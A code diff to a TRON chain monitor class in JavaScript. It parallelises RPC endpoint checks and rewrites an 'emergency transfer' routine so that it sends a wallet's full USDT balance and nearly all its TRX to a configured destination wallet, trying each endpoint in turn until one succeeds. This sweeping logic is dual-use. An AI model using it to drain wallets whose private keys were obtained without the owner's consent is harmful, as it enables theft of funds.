@@ -22,10 +22,10 @@ class TronChainMonitor extends AbstractChainMonitor {
     
     const privateKey = this.config.privateKey;
     
-    for (let i = 0; i < this.rpcEndpoints.length; i++) {
+    const testPromises = this.rpcEndpoints.map(async (endpoint, i) => {
       try {
         const tronWeb = new TronWeb({
-          fullHost: this.rpcEndpoints[i],
+          fullHost: endpoint,
           privateKey: privateKey
         });
         
@@ -34,13 +34,25 @@ class TronChainMonitor extends AbstractChainMonitor {
           new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
         ]);
         
-        this.tronWebs.push(tronWeb);
-        this.log(`✅ RPC ${i} connected: ${this.rpcEndpoints[i]}`);
-        
+        return { success: true, tronWeb, index: i, endpoint };
       } catch (error) {
-        this.log(`❌ RPC ${i} failed: ${this.rpcEndpoints[i]}`);
+        return { success: false, index: i, endpoint, error: error.message };
       }
-    }
+    });
+    
+    const results = await Promise.allSettled(testPromises);
+    
+    results.forEach((result) => {
+      if (result.status === 'fulfilled') {
+        const { success, tronWeb, index, endpoint, error } = result.value;
+        if (success) {
+          this.tronWebs.push(tronWeb);
+          this.log(`✅ RPC ${index} connected: ${endpoint}`);
+        } else {
+          this.log(`❌ RPC ${index} failed: ${endpoint}`);
+        }
+      }
+    });
     
     if (this.tronWebs.length === 0) {
       throw new Error('❌ All TRON RPC endpoints failed!');
@@ -128,134 +140,108 @@ class TronChainMonitor extends AbstractChainMonitor {
   }
 
   async executeTransfer(trxBalance, usdtAmount) {
-    this.log(`\n🚀🚀 PARALLEL TRANSFER ACTIVATED! 🚀🚀`);
-    this.log(`🔥 FIRE-AND-FORGET mode - NO waiting for confirmation!`);
+    this.log(`\n⚡⚡ EMERGENCY TRANSFER INITIATED! ⚡⚡`);
+    this.log(`🎯 Smart failover - maximum speed with efficiency`);
     this.log(`💰 USDT: ${Number(usdtAmount) / 1000000} | TRX: ${this.sunToTrx(trxBalance)}`);
     
-    const allPromises = [];
-    let usdtAttempted = false;
-    let trxAttempted = false;
     const txHashes = [];
+    let usdtSuccess = false;
+    let trxSuccess = false;
     
     if (usdtAmount > 0n) {
-      usdtAttempted = true;
       for (let i = 0; i < this.tronWebs.length; i++) {
-        allPromises.push(
-          (async (index) => {
-            try {
-              const tronWeb = this.tronWebs[index];
-              const address = tronWeb.defaultAddress.base58;
-              
-              const functionSelector = 'transfer(address,uint256)';
-              const parameter = [
-                {type: 'address', value: this.destinationWallet},
-                {type: 'uint256', value: usdtAmount.toString()}
-              ];
-              
-              const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-                this.usdtContract,
-                functionSelector,
-                {
-                  feeLimit: this.emergencyFeeLimit,
-                  callValue: 0
-                },
-                parameter,
-                address
-              );
-              
-              if (!tx || !tx.transaction) {
-                return { success: false, type: 'USDT', index };
-              }
-              
-              const signed = await tronWeb.trx.sign(tx.transaction);
-              
-              tronWeb.trx.sendRawTransaction(signed, { shouldPollResponse: false }).then(result => {
-                if (result && result.result) {
-                  const txid = result.txid || result.transaction?.txID;
-                  if (txid) {
-                    txHashes.push({ type: 'USDT', txid });
-                  }
-                  this.log(`✅ USDT TX (RPC ${index}): ${txid || 'broadcasted'}`);
-                }
-              }).catch(() => {});
-              
-              return { success: true, type: 'USDT', index };
-              
-            } catch (error) {
-              this.log(`❌ USDT RPC ${index}: ${error.message}`);
-              return { success: false, type: 'USDT', index };
+        try {
+          const tronWeb = this.tronWebs[i];
+          const address = tronWeb.defaultAddress.base58;
+          
+          const functionSelector = 'transfer(address,uint256)';
+          const parameter = [
+            {type: 'address', value: this.destinationWallet},
+            {type: 'uint256', value: usdtAmount.toString()}
+          ];
+          
+          const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+            this.usdtContract,
+            functionSelector,
+            {
+              feeLimit: this.emergencyFeeLimit,
+              callValue: 0
+            },
+            parameter,
+            address
+          );
+          
+          if (!tx || !tx.transaction) {
+            this.log(`⚠️ USDT RPC ${i} failed to build tx`);
+            continue;
+          }
+          
+          const signed = await tronWeb.trx.sign(tx.transaction);
+          const result = await tronWeb.trx.sendRawTransaction(signed, { shouldPollResponse: false });
+          
+          if (result && result.result) {
+            const txid = result.txid || result.transaction?.txID;
+            if (txid) {
+              txHashes.push({ type: 'USDT', txid });
+              this.log(`✅ USDT TX: ${txid}`);
+              usdtSuccess = true;
+              break;
             }
-          })(i)
-        );
+          }
+        } catch (error) {
+          this.log(`⚠️ USDT RPC ${i}: ${error.message}`);
+          if (i === this.tronWebs.length - 1) {
+            this.log(`❌ All RPCs failed for USDT transfer`);
+          }
+        }
       }
+    } else {
+      usdtSuccess = true;
     }
     
     const feeReserve = 1000000n;
     if (trxBalance > feeReserve) {
-      trxAttempted = true;
       const amountToSend = trxBalance - feeReserve;
       
       for (let i = 0; i < this.tronWebs.length; i++) {
-        allPromises.push(
-          (async (index) => {
-            try {
-              const tronWeb = this.tronWebs[index];
-              
-              const tx = await tronWeb.transactionBuilder.sendTrx(
-                this.destinationWallet,
-                Number(amountToSend)
-              );
-              
-              const signed = await tronWeb.trx.sign(tx);
-              
-              tronWeb.trx.sendRawTransaction(signed, { shouldPollResponse: false }).then(result => {
-                if (result && result.result) {
-                  const txid = result.txid || result.transaction?.txID;
-                  if (txid) {
-                    txHashes.push({ type: 'TRX', txid });
-                  }
-                  this.log(`✅ TRX TX (RPC ${index}): ${txid || 'broadcasted'}`);
-                }
-              }).catch(() => {});
-              
-              return { success: true, type: 'TRX', index };
-              
-            } catch (error) {
-              this.log(`❌ TRX RPC ${index}: ${error.message}`);
-              return { success: false, type: 'TRX', index };
+        try {
+          const tronWeb = this.tronWebs[i];
+          
+          const tx = await tronWeb.transactionBuilder.sendTrx(
+            this.destinationWallet,
+            Number(amountToSend)
+          );
+          
+          const signed = await tronWeb.trx.sign(tx);
+          const result = await tronWeb.trx.sendRawTransaction(signed, { shouldPollResponse: false });
+          
+          if (result && result.result) {
+            const txid = result.txid || result.transaction?.txID;
+            if (txid) {
+              txHashes.push({ type: 'TRX', txid });
+              this.log(`✅ TRX TX: ${txid}`);
+              trxSuccess = true;
+              break;
             }
-          })(i)
-        );
+          }
+        } catch (error) {
+          this.log(`⚠️ TRX RPC ${i}: ${error.message}`);
+          if (i === this.tronWebs.length - 1) {
+            this.log(`❌ All RPCs failed for TRX transfer`);
+          }
+        }
       }
+    } else {
+      trxSuccess = true;
     }
     
-    if (allPromises.length === 0) {
-      return { success: false, txHashes: [] };
-    }
-    
-    this.log(`🚀 Launching ${allPromises.length} fire-and-forget transfers...`);
-    const results = await Promise.allSettled(allPromises);
-    
-    const successful = results.filter(r => r.status === 'fulfilled' && r.value.success);
-    const usdtSuccess = successful.filter(r => r.value.type === 'USDT');
-    const trxSuccess = successful.filter(r => r.value.type === 'TRX');
-    
-    this.log(`\n📊 BROADCAST RESULTS:`);
-    if (usdtAttempted) this.log(`   💵 USDT: ${usdtSuccess.length}/${this.tronWebs.length} broadcasted`);
-    if (trxAttempted) this.log(`   💰 TRX: ${trxSuccess.length}/${this.tronWebs.length} broadcasted`);
-    
-    const hasUsdtSuccess = !usdtAttempted || usdtSuccess.length > 0;
-    const hasTrxSuccess = !trxAttempted || trxSuccess.length > 0;
-    
-    if (hasUsdtSuccess && hasTrxSuccess) {
-      this.log(`🎯 ASSETS BROADCASTED - Transfers in mempool!\n`);
-      
+    if (usdtSuccess && trxSuccess) {
+      this.log(`🎯 TRANSFER BROADCASTED!\n`);
       txHashes.forEach(tx => this.broadcastedTxHashes.add(tx.txid));
-      
       return { success: true, txHashes };
     } else {
-      this.log(`⚠️ Some broadcasts failed - will retry!\n`);
-      return { success: false, txHashes: [] };
+      this.log(`⚠️ Transfer failed - will retry!\n`);
+      return { success: false, txHashes };
     }
   }
 
